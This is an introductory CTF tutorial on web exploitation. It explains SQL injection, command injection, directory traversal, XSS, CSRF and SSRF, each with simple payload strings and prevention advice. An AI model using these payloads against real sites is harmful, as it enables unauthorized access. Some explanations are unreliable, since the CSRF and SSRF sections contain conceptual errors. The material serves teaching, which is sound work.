---
title: "Web Exploitation"
categories:
  - Hacking
---

Web exploitation involves identifying and exploiting vulnerabilities in web applications and websites. In CTFs, these vulnerabilities are presented as web security challenges where the user needs to exploit a bug to gain higher-level privileges.

As a beginner, it's important to understand common vulnerabilities like SQL injection, cross-site scripting (XSS), server-side request forgery (SSRF), and others. By learning about these vulnerabilities and how to exploit them, you'll develop important skills that will help you succeed in web security challenges. As you progress, you can also learn how to secure web applications and websites to protect against potential attacks.

Some of the most commonly found exploitation's:

- [SQL Injection](#sql-injection)
- [Command Injection](#command-injection)
- [Directory Traversal](#directory-traversal)
- [Cross Site Scripting (XSS)](#cross-site-scripting-xss)
  - [Reflected XSS](#reflected-xss)
  - [Stored XSS](#stored-xss)
  - [DOM XSS](#dom-xss)
- [Cross Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)


# SQL Injection

SQL Injection is a security vulnerability that occurs when an application
accepts user input without properly checking it for extra SQL code. This means
that if a malicious user enters a specially crafted input, the application
could execute unintended SQL commands and potentially access data they
shouldn't have access to.

For example, let's say there's a website that requires users to enter their
username and password to log in. The website uses the following SQL query to
check if the user's credentials are correct:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

If the website doesn't properly check user input, a malicious user could enter
code in the username or password fields that changes the SQL query and allows
them to log in without a valid username or password. For instance, consider
this input:

```
Username: ' OR 1=1--
Password:
```

The resulting SQL query would look like this:

```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password=''
```

In this case, the `OR 1=1` statement modifies the SQL query to select all rows
in the "users" table, and the `--` comment hides the rest of the original
query. This means that the attacker could log in without knowing a valid
username or password.

Another example is when a user enters a single quote character in their input,
which could break the SQL query and cause an error. For example:

```php
<?php
$username = $_GET['username']; // if the user enters a single quote here, it could break the SQL query
$result = mysql_query("SELECT * FROM users WHERE username='$username'");
?>
```

A malicious user could enter a single quote in the username field, which would
result in the following SQL query:

```sql
SELECT * FROM users WHERE username=''''
```

This query is incorrect and will cause the application to crash.

Using SQL injection techniques, attackers can manipulate SQL queries to return
data that they are not supposed to have access to. It's important for
developers to properly validate user input and sanitize data to prevent SQL
injection attacks.


# Command Injection

Command Injection is a vulnerability that arises when an application allows a
user to enter system commands that are executed by the operating system. This
can occur when the application fails to properly encode or sanitize user input
that is passed to a system shell. This vulnerability is often seen when a
developer uses the system() command or its equivalent in the programming
language of the application.

Consider the following Python code that uses the `os.system()` function to
ping a domain:

```python
import os
domain = user_input() # example.com
os.system('ping ' + domain)
```

In this code, the user is prompted to enter a domain to ping. However, if the
user enters a semicolon followed by another command, such as "; ls", the
operating system will execute both commands, as shown below:

```python
import os
domain = user_input() # ; ls
os.system('ping ' + domain)
```

In this example, the semicolon acts as a command separator, causing the ping
command to be terminated early, and the `ls` command to be executed instead.
This is the core concept behind command injection.

Command injection can be used to execute other system commands as well, such
as `wget`, `curl`, and `bash`, among others. It is a common means of privilege
escalation within web applications and applications that interface with system
commands. Many home routers, for example, are vulnerable to command injection
because they take user input and directly append it to a system command.

Other examples of payloads that can be used for command injection include:

* `;ls`
* `$(pwd)`
* `whoami`

Developers can prevent command injection by validating and sanitizing user
input, as well as using safe programming practices such as input encoding,
parameterized queries, and avoiding the use of system commands whenever
possible.


# Directory Traversal

Directory Traversal is a security vulnerability that occurs when an
application accepts user input to construct a directory path but fails to
properly sanitize or sandbox the input. This vulnerability can allow an
attacker to traverse up and down the directory structure of the file system
and access files they shouldn't have access to.

Consider this PHP code that allows the user to choose what page to load from a
**GET** parameter:

```php
<?php
$page = $_GET['page']; // index.php
include("/var/www/html/" . $page);
?>
```

Under normal operation, the page would be "`index.php`". However, if a
malicious user were to submit a different value for the "`page`" parameter,
such as "`../../../../../../../../etc/passwd`", the code could be manipulated
to load the "`/etc/passwd`" file instead of the intended file.

```php
<?php
$page = $_GET['page']; // ../../../../../../../../etc/passwd
include("/var/www/html/" . $page);
?>
```

In this example, the user is submitting
"`../../../../../../../../etc/passwd`". This will cause the PHP interpreter to
leave the directory that it is coded to look in ("`/var/www/html`") and
instead be forced up to the root folder. Ultimately, this will become
"`/etc/passwd`" because the computer will not go a directory above its top
directory.

The application will then load the "`/etc/passwd`" file and output something
of the following to the user:

```
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
vnstat:x:101:102:vnstat:/var/lib/vnstat:/bin/false
redis:x:102:103:redis:/var/lib/redis:/bin/false
```

The concept of directory traversal can be applied to any application that
accepts input from a user to construct a file path. This vulnerability can be
exploited to gain unauthorized access to sensitive data, such as configuration
files, application source code, or user data, by manipulating the input to
traverse to directories outside of the intended scope.

Attackers can use the obtained data to launch further attacks, such as
extracting credentials, injecting malicious code, or launching phishing
campaigns. Therefore, it is critical to properly sanitize and validate user
input to prevent directory traversal attacks and ensure the security of the
application and the system it runs on.


# Cross Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to
inject malicious code into a web page viewed by other users. This type of
attack can take many forms, but the most common ones are Reflected XSS, Stored
XSS, and DOM XSS.

Watch this informative video to get a deep understanding and live demos of how
XSS works.

[![Website Hacking Demos using Cross-Site Scripting (XSS)](https://img.youtube.com/vi/PzRQhpbYbeg/0.jpg)](https://www.youtube.com/watch?v=PzRQhpbYbeg)


## [Reflected XSS](#reflected-xss)

Reflected XSS is a type of XSS attack where the malicious script is reflected
back to the user by the server in response to a request. This type of attack
usually requires some form of user interaction, such as clicking on a link or
submitting a form. Here's an example of a Reflected XSS attack:

Suppose a website allows users to search for products by entering a keyword in
a search box. The search term is then included in the URL of the search
results page, like this:

```
https://example.com/search?q=[SEARCH_TERM]
```

An attacker could craft a URL that includes a script tag, like this:

```
`https://example.com/search?q=<script>alert('XSS!');</script>`
```

Such an example could be easily implemented given the following command
involving curl:

```bash
$ curl "https://example.com/search?q=<script>alert('XSS!');</script>"
```

If a user clicks on this link, the server will reflect the search term back to
the user, including the malicious script tag. When the user's browser
processes the script, it will execute the alert function and display an alert
box that says "XSS!".

## [Stored XSS](#stored-xss)

Stored XSS is a type of XSS attack where the attacker injects malicious code
into a web page that is permanently stored on the server and served to all
users who view the page. This type of attack is especially dangerous because
it can affect many users at once and can be difficult to detect and remove.
Here's an example of a Stored XSS attack:

Suppose a website allows users to post comments on articles. The comments are
then stored in a database and displayed on the article page. An attacker could
post a comment that includes a script tag, like this:

```html
<script>alert('XSS!');</script>
```

When other users view the article page, the server will serve the stored
comment to them, including the malicious script tag. When the user's browser
processes the script, it will execute the alert function and display an alert
box that says "XSS!".

## [DOM XSS](#dom-xss)

DOM XSS is a type of XSS attack where the attacker injects malicious code into
a web page that is processed by the user's browser, rather than the server.
This type of attack is usually caused by client-side JavaScript code that is
vulnerable to input from untrusted sources. Here's an example of a DOM XSS
attack:

Suppose a website includes a form that allows users to enter their name and
displays a personalized greeting on the page. The greeting is generated using
client-side JavaScript code, like this:

```html
<p id="greeting"></p>

<script>

var name = document.getElementById("name").value;

document.getElementById("greeting").innerHTML = "Hello, " + name + "!";

</script>
```

An attacker could submit a name that includes a script tag, like this:

```html
<script>alert('XSS!');</script>
```

When the user's browser processes the script, it will execute the alert
function and display an alert box that says "XSS!". This type of attack can be
prevented by properly sanitizing user input and using a Content Security
Policy (CSP) to restrict the execution of scripts on the page.

To prevent XSS attacks, web developers should sanitize all user input and use
server-side validation to ensure that the input conforms to expected formats.
Additionally, developers should use input validation and output encoding to
prevent untrusted input from being executed as code. Finally, web developers
should use a Content Security Policy (CSP) to restrict the types of scripts
that can be executed on a page, and to prevent inline scripts from being
executed altogether.

XSS attacks are dangerous and can lead to a wide range of consequences,
including stealing user credentials, taking control of user accounts, defacing
websites, and stealing sensitive data. It is important for web developers to
understand the risks associated with XSS and take steps to prevent it in their
applications.

By understanding the different types of XSS attacks and implementing proper
security measures, web developers can protect their users from the dangers of
XSS and ensure the safety and integrity of their applications.


# Cross Site Request Forgery (CSRF)

A Cross-Site Request Forgery (CSRF) attack is a type of attack that targets an
authenticated user and leverages their active session to perform unauthorized
actions, such as making a purchase, transferring funds, or changing account
details.

The success of a CSRF attack relies on session hijacking, which occurs when an
attacker injects malicious elements, such as an `<img>` or `<iframe>` tag,
into a webpage. These elements reference external resources that have not been
verified, and when a user interacts with the webpage, their session is used to
execute the unauthorized action without their knowledge or consent.

To prevent CSRF attacks, web developers should implement measures such as
anti-CSRF tokens, which generate unique tokens for each user session and
validate them upon submission, or implement same-site cookies, which prevent
unauthorized access to cookies across different sites.

Websites commonly use HTTP `GET` requests to receive user input, such as
search queries or form submissions. In some cases, these requests can include
sensitive information, such as account details or financial transactions.

For example, when a user logs in to a banking site, their browser may receive
a session cookie that keeps them logged in. When the user initiates a
transaction, the URL that is sent to the server may contain sensitive
information, such as the recipient's account number and the amount of money
being transferred, in the following format:

```
https://examplebank.com/transfer.do?recipient=[ACCOUNT_NUMBER]&amount=[AMOUNT]&sessionid=[SESSION_ID]
```

An attacker can exploit this vulnerability by tricking the user into clicking
on a hyperlink or loading an image that references a malicious URL that
follows the same format. For instance, an attacker could include an invisible
image tag with the malicious URL as its source, causing the user's browser to
automatically send a request to the attacker's server, without the user's
knowledge or consent.

Here's an example of a malicious URL:
```html
<img src="https://examplebank.com/transfer.do?recipient=[ATTACKER_ACCOUNT]&amount=[HUGE_AMOUNT]&sessionid=[ATTACKER_SESSION_ID]" width="0" height="0" border="0">
```

# Server-Side Request Forgery (SSRF)

Server Side Request Forgery (SSRF) is a web application vulnerability that
allows an attacker to make requests to other systems or services that the
vulnerable application has access to. This can be used to perform attacks on
internal systems or retrieve sensitive information.

SSRF attacks occur when an application processes a user-supplied URL and makes
a request to that URL. An attacker can manipulate the URL to make the
application send requests to other systems or services that are accessible to
the application.

An example of an SSRF attack involves a web application that allows users to
upload profile pictures that are stored on a separate server. The application
uses the following code to retrieve the user's profile picture:

```php
<?php
$url = 'https://profilepictures.com/' . $_GET['picture_id'];
$data = file_get_contents($url);
echo '<img src="' . $url . '">';
?>
```

An attacker could exploit an SSRF vulnerability by providing a malicious URL
as the `picture_id` parameter, such as:

```
https://profilepictures.com/?picture_id=http://attacker.com/malicious_script
```

When the application requests the user's profile picture using the URL
provided in the `picture_id` parameter, it will make a request to
`http://attacker.com/malicious_script`. The attacker can then use this request
to launch further attacks on internal systems or retrieve sensitive
information.

For example, the attacker could modify the URL to access an internal web
service:

```
https://profilepictures.com/?picture_id=http://internal-service.local:8080
```

If the internal service is not properly secured, the attacker could
potentially access sensitive data or carry out further attacks.

SSRF attacks can be prevented by implementing proper input validation and
sanitization, as well as restricting the access that the application has to
other systems and services. Additionally, applications should be tested
thoroughly for SSRF vulnerabilities, and any discovered vulnerabilities should
be patched as soon as possible.

